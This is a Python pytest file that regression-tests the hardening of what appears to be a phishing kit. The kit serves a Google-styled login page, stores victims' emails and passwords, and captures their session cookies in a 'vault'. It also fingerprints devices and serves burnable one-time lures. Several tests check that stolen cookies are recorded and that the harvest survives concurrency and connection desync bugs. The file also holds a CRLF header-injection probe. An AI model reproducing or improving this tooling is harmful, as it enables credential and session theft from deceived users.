"""Regression tests for the hardening pass over the static server and the store.

Every test here pins a defect that was CONFIRMED by running the real code first:

* a CR/LF in `?s=` injected response-header lines (response splitting) and any value
  was echoed into the campaign cookie (session fixation);
* a request body nobody read stayed in rfile and was parsed as the next request line
  on the keep-alive connection (a GET carrying a body, a POST answered with the
  challenge interstitial);
* a partial POST parked its worker thread forever (no socket timeout);
* the class-level caches and the intel table were keyed by client-supplied values with
  no cap;
* the cookie-recording expression evaluated to [] in every case, so the vault never
  recorded a cookie the victim sent;
* a cookie-less page view wrote a durable session row;
* two simultaneous first intel waves for one sid wrote two rows;
* wipe() recorded its counts before the DELETE inside a suppress(), so a failed wipe
  reported success;
* a one-time lure was served twice under concurrency while the row counted one use.

Run:  ./.venv/bin/python -m pytest tests/test_server_hardening.py -q
"""
import http.client
import json
import os
import socket
import sys
import tempfile
import threading
import time

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import capture as cap  # noqa: E402
from core import server as srv  # noqa: E402
from core.challenge import Challenge  # noqa: E402
from core.intel import INTEL_PATH  # noqa: E402
from core.lures import Lure  # noqa: E402

pytestmark = pytest.mark.integration


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


@pytest.fixture()
def rig():
    db_path = os.path.join(tempfile.mkdtemp(prefix="bp_hard_"), "hard.db")
    port = free_port()
    httpd, _ = srv.serve("templates", "templates/03_google", port, db_path,
                         geo_provider="off", site_name="google", otp=True)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.5)
    yield {"port": port, "db_path": db_path, "db": cap.CaptureDB(db_path),
           "handler": httpd.RequestHandlerClass}
    httpd.shutdown()


class TestTheIntelRouteCannotInjectHeaders:
    def test_a_crlf_in_the_query_does_not_inject_a_header_line(self, rig):
        c = http.client.HTTPConnection("127.0.0.1", rig["port"], timeout=10)
        c.request("GET", "/__bh/intel.js?s=x%0d%0aX-Injected:%20PWNED")
        r = c.getresponse()
        r.read()
        names = [k.lower() for k, _ in r.getheaders()]
        assert "x-injected" not in names
        c.close()

    def test_the_cookie_is_always_the_server_issued_id(self, rig):
        """An attacker-chosen ?s= must not become the victim's session id."""
        chosen = "deadbeefdeadbeefdeadbeefdeadbeef"
        c = http.client.HTTPConnection("127.0.0.1", rig["port"], timeout=10)
        c.request("GET", f"/__bh/intel.js?s={chosen}")
        r = c.getresponse()
        r.read()
        cookies = [v for k, v in r.getheaders() if k.lower() == "set-cookie"]
        assert cookies, "the route must still issue a cookie"
        assert chosen not in "".join(cookies), cookies
        c.close()


class TestAnUnreadBodyCannotDesyncTheConnection:
    def test_a_get_with_a_body_leaves_the_next_request_intact(self, rig):
        c = http.client.HTTPConnection("127.0.0.1", rig["port"], timeout=10)
        body = b"email=victim@x.tld&password=Sup3rSecret!"
        c.putrequest("GET", "/")
        c.putheader("Content-Length", str(len(body)))
        c.endheaders()
        c.send(body)
        first = c.getresponse()
        first.read()
        c.request("GET", "/health")
        second = c.getresponse()
        assert second.status == 200
        assert second.read().strip() == b"ok"
        c.close()

    def test_a_challenged_post_does_not_echo_the_credentials_back(self, rig):
        """The challenged branch answers without reading the body; the leftover bytes
        were parsed as the next request line and echoed inside a 501."""
        db_path = os.path.join(tempfile.mkdtemp(prefix="bp_chal_"), "chal.db")
        port = free_port()
        httpd, _ = srv.serve("templates", "templates/03_google", port, db_path,
                             geo_provider="off", site_name="google",
                             challenge=Challenge(secret=b"k" * 32))
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.5)
        c = None
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
            body = b"email=victim@x.tld&password=Sup3rSecret!"
            c.putrequest("POST", "/")
            c.putheader("Content-Length", str(len(body)))
            c.putheader("Content-Type", "application/x-www-form-urlencoded")
            c.endheaders()
            c.send(body)
            first = c.getresponse()
            first.read()
            c.request("GET", "/health")
            second = c.getresponse()
            payload = second.read()
            assert b"Sup3rSecret" not in payload, payload[:200]
        finally:
            httpd.shutdown()
            if c is not None:
                c.close()


class TestTheServerIsBounded:
    def test_the_handler_has_a_read_timeout(self, rig):
        """A partial POST parks a worker thread in rfile.read(); the socket timeout is
        what cuts it loose."""
        assert getattr(rig["handler"], "timeout", None)
        assert rig["handler"].timeout <= 60

    def test_the_class_caches_are_capped(self, rig):
        assert rig["handler"]._cache_cap == 512
        # the helper evicts instead of growing without bound
        cache = {}
        for i in range(600):
            rig["handler"]._cache_put(cache, f"k{i}", (time.time(), {"i": i}))
        assert len(cache) <= rig["handler"]._cache_cap


class TestTheVaultRecordsWhatTheVictimSent:
    def test_a_cookie_the_victim_sends_is_recorded(self, rig):
        """The old expression `... .count("=") and [] or []` always produced [], so a
        captured session showed credentials and silently no cookies."""
        c = http.client.HTTPConnection("127.0.0.1", rig["port"], timeout=10)
        c.request("GET", "/", headers={"Cookie": "sessionid=SECRETVICTIMTOKEN; a=1"})
        c.getresponse().read()
        c.request("POST", "/", body="email=v@x.tld&password=pw",
                  headers={"Content-Type": "application/x-www-form-urlencoded",
                           "Cookie": "sessionid=SECRETVICTIMTOKEN"})
        c.getresponse().read()
        c.close()
        time.sleep(0.5)
        listed = rig["db"].session_list(limit=10)
        assert listed, "the credential POST wrote no session record"
        rec = rig["db"].session_get(listed[0]["sid"])
        blob = json.dumps(rec)
        assert "SECRETVICTIMTOKEN" in blob, blob[:600]

    def test_a_cookie_less_page_view_writes_no_session_row(self, rig):
        """A record whose only content is the 'opened' event is not a session; every
        cookie-less view used to write one durable row."""
        before = rig["db"].stats()["visitors"]
        for _ in range(5):
            c = http.client.HTTPConnection("127.0.0.1", rig["port"], timeout=10)
            c.request("GET", "/")
            c.getresponse().read()
            c.close()
        time.sleep(0.3)
        sessions = rig["db"]._conn().execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
        assert sessions == 0, f"a page view wrote a session row ({sessions})"
        assert rig["db"].stats()["visitors"] >= before


class TestTheIntelWriteIsAtomic:
    def test_parallel_first_waves_for_one_sid_write_one_row(self, rig):
        """A check-then-insert with no lock let two simultaneous first waves both take
        the insert branch, and duplicate rows inflate the per-device hit count."""
        sid = "a" * 32
        payload = json.dumps({"sid": sid, "wave": "open",
                              "ua": "Mozilla/5.0 (Windows NT 10.0) Chrome/124.0",
                              "mods": {"navigator": {"userAgent": "Mozilla/5.0",
                                                     "platform": "Win32"},
                                       "screen": {"width": 1920, "height": 1080}}})

        def post():
            try:
                c = http.client.HTTPConnection("127.0.0.1", rig["port"], timeout=10)
                c.request("POST", INTEL_PATH, body=payload,
                          headers={"Content-Type": "application/json"})
                c.getresponse().read()
                c.close()
            except Exception:
                pass

        threads = [threading.Thread(target=post) for _ in range(6)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        time.sleep(0.3)
        rows = rig["db"]._conn().execute(
            "SELECT COUNT(*) FROM intel WHERE sid=?", (sid,)).fetchone()[0]
        assert rows == 1, f"{rows} intel rows for one sid"


class TestWipeReportsTheTruth:
    def test_a_failed_delete_is_not_reported_as_removed(self, tmp_path):
        db = cap.CaptureDB(str(tmp_path / "w.db"))
        db.record("http://x/", "1.2.3.4", "", "", "", "Mozilla/5.0", "desktop",
                  {"email": "a@b.test", "password": "pw"}, 1)
        # make the delete fail: a read-only connection still counts rows
        real_conn = db._conn

        class Broken:
            def execute(self, sql, *a):
                if sql.strip().upper().startswith("DELETE"):
                    raise RuntimeError("database is locked")
                return real_conn().execute(sql, *a)

            def commit(self):
                return real_conn().commit()

        db._conn = lambda: Broken()
        removed = db.wipe("all")
        assert removed.get("failed"), removed
        assert "captures" in removed["failed"]
        # and the working path still reports cleanly
        db._conn = real_conn
        clean = db.wipe("all")
        assert not clean.get("failed"), clean


class TestAOneTimeLureIsServedOnce:
    def test_concurrent_opens_do_not_bypass_the_burn(self, tmp_path):
        """lure_use incremented a stale object resolved outside the lock, so two
        simultaneous visitors both passed the burned check and the second write
        overwrote the first: a one-time lure served twice, the row counting one."""
        db = cap.CaptureDB(str(tmp_path / "l.db"))
        lure = db.lure_create(Lure(kind="one-time", label="t", max_uses=1))
        served = []
        lock = threading.Lock()

        def use():
            try:
                if db.lure_use(lure, ip="10.0.0.1"):
                    with lock:
                        served.append(1)
            except Exception:
                pass

        for _ in range(8):
            threads = [threading.Thread(target=use) for _ in range(6)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            if len(served) > 1:
                break
        assert len(served) == 1, f"a one-time lure was served {len(served)} times"
        row = db._conn().execute("SELECT uses FROM lures WHERE id=?",
                                 (lure.id,)).fetchone()[0]
        assert row == 1, row
